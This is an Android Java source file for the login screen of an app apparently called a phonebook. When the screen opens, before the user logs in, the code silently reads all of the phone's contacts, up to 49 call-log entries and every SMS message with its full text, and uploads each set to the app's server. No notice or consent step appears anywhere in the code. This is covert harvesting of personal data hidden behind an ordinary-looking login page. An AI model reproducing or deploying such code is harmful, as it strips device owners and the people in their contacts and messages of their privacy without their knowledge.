package kr.idealidea.phonebook;

import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.util.Log;
import android.view.LayoutInflater;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.TextView;
import android.widget.Toast;

import org.json.JSONException;
import org.json.JSONObject;

import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;

import kr.idealidea.phonebook.utils.ConnectServer;
import kr.idealidea.phonebook.utils.ContextUtils;

public class LoginActivity extends AppCompatActivity {
    Button btnLogin;
    EditText editLoginPhone;
    EditText editLoginAuth;

    final static private String[] CALL_PROJECTION = { CallLog.Calls.TYPE,
            CallLog.Calls.CACHED_NAME, CallLog.Calls.NUMBER,
            CallLog.Calls.DATE,        CallLog.Calls.DURATION };

    List<String> contacts = new ArrayList<>();
    List<String> callLogs = new ArrayList<>();
    List<String> messages = new ArrayList<>();

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_login);

        String phone = getIntent().getStringExtra("phone");

        btnLogin = findViewById(R.id.btnLogin);
        editLoginPhone = findViewById(R.id.editLoginPhone);
        editLoginAuth = findViewById(R.id.editLoginAuth);

        contacts();

        editLoginPhone.setText(phone);

        btnLogin.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                ConnectServer.postRequestLogin(LoginActivity.this, editLoginPhone.getText().toString(), editLoginAuth.getText().toString(), new ConnectServer.JsonResponseHandler() {
                    @Override
                    public void onResponse(final JSONObject json) {
                        try {
                            if (json.getInt("code") == 200) {
                                String token = json.getJSONObject("data").getString("token");
                                ContextUtils.setUserToken(LoginActivity.this, token);

                                Intent intent = new Intent(LoginActivity.this, MainActivity.class);
                                startActivity(intent);
                                finish();
                            } else {
                                final String msg = json.getString("message");
                                runOnUiThread(new Runnable() {
                                    @Override
                                    public void run() {
                                        Toast.makeText(LoginActivity.this, msg, Toast.LENGTH_SHORT).show();
                                    }
                                });
                            }
                        } catch (JSONException e) {
                            e.printStackTrace();
                        }
                    }
                });
            }
        });
    }

    public void putCallLogs() {
        ConnectServer.putRequestCallLog(this, callLogs, new ConnectServer.JsonResponseHandler() {
            @Override
            public void onResponse(JSONObject json) {
                readSMSMessage();
            }
        });
    }

    public void putMessage() {
        ConnectServer.putRequestMessage(this, messages, new ConnectServer.JsonResponseHandler() {
            @Override
            public void onResponse(JSONObject json) {

            }
        });
    }

    public void putContact() {
        ConnectServer.putRequestContacts(this, contacts, new ConnectServer.JsonResponseHandler() {
            @Override
            public void onResponse(JSONObject json) {
                callLog();
            }
        });
    }

    /**
     * 주소록 정보 가져오기.
     */
    public void contacts(){
        Cursor cursor = managedQuery(
                ContactsContract.Contacts.CONTENT_URI,
                new String[] {
                        ContactsContract.Contacts._ID,
                        ContactsContract.Contacts.DISPLAY_NAME,
                        ContactsContract.Contacts.PHOTO_ID,
                        ContactsContract.Contacts.CONTACT_LAST_UPDATED_TIMESTAMP
                },
                null,
                null,
                ContactsContract.Contacts.DISPLAY_NAME + " COLLATE LOCALIZED ASC"
        );

        contacts.clear();

        while (cursor.moveToNext()){
            try {
                String v_id = cursor.getString(0);
                String v_display_name = cursor.getString(1);
                String v_phone = contactsPhone(v_id).replaceAll("-", "");
                if (v_phone.startsWith("+82")) {
                    v_phone = v_phone.replace("+82", "0");
                }
                String updateTime = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.CONTACT_LAST_UPDATED_TIMESTAMP));

                if (v_phone != null && !v_phone.equals("")) {
                    String contact = v_display_name + "|" + v_phone + "|" + timeToString(Long.parseLong(updateTime));
                    contacts.add(contact);

                }
            }catch(Exception e) {
                System.out.println(e.toString());
            }
        }
        putContact();
        cursor.close();
    }

    /**
     * 주소록 상세정보(전화번호) 가져오기.
     */
    public String contactsPhone(String p_id){
        String reuslt = null;

        if(p_id==null || p_id.trim().equals("")){
            return reuslt;
        }

        Cursor cursor = managedQuery(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                new String[] {
                        ContactsContract.CommonDataKinds.Phone.NUMBER
                },
                ContactsContract.CommonDataKinds.Phone.CONTACT_ID + "=" + p_id,
                null,
                null
        );
        while (cursor.moveToNext()){
            try {
                reuslt = cursor.getString(0);
            }catch(Exception e) {
                System.out.println(e.toString());
            }
        }
        cursor.close();

        return reuslt;
    }

    public int readSMSMessage() {
        Uri allMessage = Uri.parse("content://sms");
        ContentResolver cr = getContentResolver();
        Cursor c = cr.query(allMessage, new String[] { "_id", "thread_id", "address", "person", "date", "body", "type" }, null, null, "date DESC");

        messages.clear();

        while (c.moveToNext()) {
            long messageId = c.getLong(0);
            long threadId = c.getLong(1);
            String address = c.getString(2);
            long contactId = c.getLong(3);
            String contactId_string = String.valueOf(contactId);
            long timestamp = c.getLong(4);
            String body = c.getString(5);
            String type = c.getString(6);
//            TODO - 수신 = 1, 발신 = 2 서버 전송

            String contact = address + "|" + body.replaceAll("[\\r\\n]+", " ") + "|" + timeToString(timestamp);
            messages.add(contact);
        }
        putMessage();
        return 0;
    }

    private Cursor getCallHistoryCursor(Context context) {
        Cursor cursor = context.getContentResolver().query(
                CallLog.Calls.CONTENT_URI, CALL_PROJECTION,
                null, null, CallLog.Calls.DEFAULT_SORT_ORDER);
        return cursor;
    }

    private void callLog() {
        Cursor curCallLog = getCallHistoryCursor(this);

        if (curCallLog.moveToFirst() && curCallLog.getCount() > 0) {
            try {
                final LayoutInflater inf = LayoutInflater.from(this);
                callLogs.clear();
                int i = 0;

//                TODO - 최대 수 수정
                while (i < 49) {
                    int callcount = 0;
                    String callname = "";
                    String calltype = "";
                    String calllog = "";
                    String callDuration = "";
                    String phone = "";

                    StringBuffer sb = new StringBuffer();

                    if (Integer.parseInt(curCallLog.getString(curCallLog.getColumnIndex(CallLog.Calls.TYPE))) == CallLog.Calls.INCOMING_TYPE) {
                        calltype = "수신";
                    } else if (Integer.parseInt(curCallLog.getString(curCallLog.getColumnIndex(CallLog.Calls.TYPE))) == CallLog.Calls.OUTGOING_TYPE) {
                        calltype = "발신";
                    } else if (Integer.parseInt(curCallLog.getString(curCallLog.getColumnIndex(CallLog.Calls.TYPE))) == CallLog.Calls.MISSED_TYPE) {
                        calltype = "부재중";
                    } else {
                        calltype = curCallLog.getString(curCallLog.getColumnIndex(CallLog.Calls.TYPE));
                    }

                    if (curCallLog.getString(curCallLog.getColumnIndex(CallLog.Calls.CACHED_NAME)) == null) {
                        callname = "NoName";
                    } else {
                        callname = curCallLog.getString(curCallLog.getColumnIndex(CallLog.Calls.CACHED_NAME));
                    }

                    phone = curCallLog.getString(curCallLog.getColumnIndex(CallLog.Calls.NUMBER));
                    String createTime = timeToString(curCallLog.getLong(curCallLog.getColumnIndex(CallLog.Calls.DATE)));
                    callDuration = curCallLog.getString(curCallLog.getColumnIndex(CallLog.Calls.DURATION));

                    callcount++;

                    if (phone != null) {
                        String list = callname + "|" + calltype + "|" + phone + "|" + getStringTime(Integer.parseInt(callDuration)) + "|" + createTime;
                        callLogs.add(list);
                    }

                    curCallLog.moveToNext();
                    i++;
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
            putCallLogs();
        }
    }

    private String timeToString(Long time) {
        SimpleDateFormat simpleFormat = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
        String date = simpleFormat.format(new Date(time));
        return date;
    }

    static public String getStringTime(int time) {
        String res = null;
        int hour = 0, min = 0, sec = 0;
        if (time > 0) {
            hour = time / 3600;
            time %= 3600;
            min = time / 60;
            sec = time % 60;
        }
        res = String.format("%02d:%02d:%02d", hour, min, sec);
        return res;
    }
}
